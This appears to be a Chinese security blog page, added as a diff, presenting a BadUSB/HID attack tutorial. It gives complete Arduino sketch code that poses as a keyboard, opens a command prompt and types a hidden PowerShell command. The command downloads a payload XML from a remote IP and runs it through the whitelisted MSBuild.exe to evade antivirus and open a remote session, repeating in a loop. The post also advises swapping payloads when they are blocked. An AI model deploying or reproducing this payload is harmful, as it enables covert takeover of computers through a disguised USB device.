@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="scareing的学习笔记" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="BadUSB:虚假的恶意USB设备从传统意义讲，当你在电脑中插入一张CD/DVD，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过BadUSB，你可以模拟出一个键盘，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控">
+<meta property="og:type" content="website">
+<meta property="og:title" content="scareing的学习笔记">
+<meta property="og:url" content="https://github.com/scareing/scareing.github.io/about/index.html">
+<meta property="og:site_name" content="scareing的学习笔记">
+<meta property="og:description" content="BadUSB:虚假的恶意USB设备从传统意义讲，当你在电脑中插入一张CD/DVD，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过BadUSB，你可以模拟出一个键盘，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/26/BadUSB%E6%B5%85%E6%9E%90/1.png">
+<meta property="og:updated_time" content="2019-10-04T08:28:29.280Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="scareing的学习笔记">
+<meta name="twitter:description" content="BadUSB:虚假的恶意USB设备从传统意义讲，当你在电脑中插入一张CD/DVD，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过BadUSB，你可以模拟出一个键盘，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/26/BadUSB%E6%B5%85%E6%9E%90/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://github.com/scareing/scareing.github.io/about/">
+
+
+
+
+
+  <title> | scareing的学习笔记</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">scareing的学习笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">道可道，非常道, 名可名，非常名!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+	<h1 class="post-title" itemprop="name headline"></h1>
+
+
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <h1 id="BadUSB-虚假的恶意USB设备"><a href="#BadUSB-虚假的恶意USB设备" class="headerlink" title="BadUSB:虚假的恶意USB设备"></a>BadUSB:虚假的恶意USB设备</h1><p>从传统意义讲，当你在电脑中插入一张CD/DVD，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过BadUSB，你可以模拟出一个键盘，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。</p>
+<ul>
+<li>Arduino: 一款开源电子原型平台，也就是常说的开发板。</li>
+<li>Arduino UNO/Leonardo: Arduino中的两种型号</li>
+<li>HID Attacks: 通过接入伪装的设备，如U盘，达到模拟键盘输入*的攻击</li>
+<li>TEENSY: 实现HID Attacks的一种设备，类似于Arduino设备。</li>
+<li>USB RUBBER DUCKY： 实现HID Attacks的一种设备，外观和U盘无差别</li>
+<li>BadUSB：基于U盘实现HID Attacks的方式</li>
+<li>kali NetHunter：基于安卓的开源移动渗透测试平台</li>
+</ul>
+<blockquote>
+<p>当Arduino插入电脑时，Arduino将会伪装成键盘，并且自动输入Arduino中的命令。说直白点，就是一双无形的手在操控你的键盘，并且可以在极短的时间内输入事先写好的指令，让受害者毫无察觉。</p>
+</blockquote>
+<p>** 只要是能通过USB连接的设备都有可能被植入攻击芯片，此攻击芯片是一个非常小巧且功能完整的单片机开发系统，也是BadUSB的核心。**</p>
+<p>在这里将会使用最常见的U盘实现BadUSB攻击演示。</p>
+<h2 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h2><pre><code>#include &lt;Keyboard.h&gt;
+void setup() {//初始化
+Keyboard.begin();//开始键盘通讯
+delay(5000);//延时
+Keyboard.press(KEY_LEFT_GUI);//win键
+delay(500);
+Keyboard.press(&apos;r&apos;);//r键
+delay(500);
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release(&apos;r&apos;);
+Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
+Keyboard.release(KEY_CAPS_LOCK);
+delay(500);
+Keyboard.println(&quot;cmd&quot;);
+delay(500);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(100);
+Keyboard.println(&quot;powershell -w hidden Invoke-WebRequest -uri   http://172.22.35.106/PAYLOAD1.XML -OutFile   1025.xml;C:/Windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 1025.xml&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(500);
+Keyboard.press(KEY_CAPS_LOCK);
+Keyboard.release(KEY_CAPS_LOCK);
+Keyboard.end();//结束键盘通讯
+}
+void loop()//循环
+{
+Keyboard.begin();//开始键盘通讯
+delay(5000);//延时
+Keyboard.press(KEY_LEFT_GUI);//win键
+delay(500);
+Keyboard.press(&apos;r&apos;);//r键
+delay(500);
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release(&apos;r&apos;);
+Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
+Keyboard.release(KEY_CAPS_LOCK);
+delay(500);
+Keyboard.println(&quot;cmd&quot;);
+delay(500);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(100);
+Keyboard.println(&quot;POWERSHELL -W HIDDEN INVOKE-WEBREQUEST -URI HTTP://172.22.35.106/PAYLOAD1.XML -OUTFILE 1025.XML;C:/WINDOWS/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 1025.XML&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(500);
+Keyboard.press(KEY_CAPS_LOCK);
+Keyboard.release(KEY_CAPS_LOCK);
+Keyboard.end();//结束键盘通讯
+}</code></pre><blockquote>
+<p>这里使用了白名单中的MSBuid.exe以达到免杀的目的，首先从服务器下载payload文件，然后用MSBuid.exe执行返回session。然后重复，不过usb插入几秒就够了，重复也不过是多返回几个session而已。</p>
+</blockquote>
+<p>  <strong>正因为HID攻击对于大众来说还属于冷门，人们甚至不知道它的存在，防范更是无从谈起，但它的危害却是非常大的，USB设备的普及更是放大了它的危害性。所有这一切都是因为连接到目标机器时的假USB是用另一个不是原设备（就像它们原本的那样）的固件执行的，冒充任何其他类型的设备并且能够执行任何类型它所连接的机器上的操作，而无需用户许可。</strong></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><blockquote>
+<p>HID攻击对某些没有外接设备的终端设备有奇效，只要有USB口就可以尝试攻击。</p>
+</blockquote>
+<blockquote>
+<p>HID攻击本身是不会被拦截的，行为可能会被拦截，这时候就得改变payload了。</p>
+</blockquote>
+<blockquote>
+<p>HID：Human Interface Device的缩写，直接与人交互的设备，例如键盘、鼠标。</p>
+</blockquote>
+<p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/26/BadUSB%E6%B5%85%E6%9E%90/1.png" alt="avatar"></p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/Bloglogo.jpg" alt="scareing">
+            
+              <p class="site-author-name" itemprop="name">scareing</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jickhab@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BadUSB-虚假的恶意USB设备"><span class="nav-number">1.</span> <span class="nav-text">BadUSB:虚假的恶意USB设备</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代码如下"><span class="nav-number">1.1.</span> <span class="nav-text">代码如下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补充"><span class="nav-number">1.2.</span> <span class="nav-text">补充</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">scareing</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+       <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+       <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+       <script type="text/javascript" src="/js/src/fireworks.js"></script>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
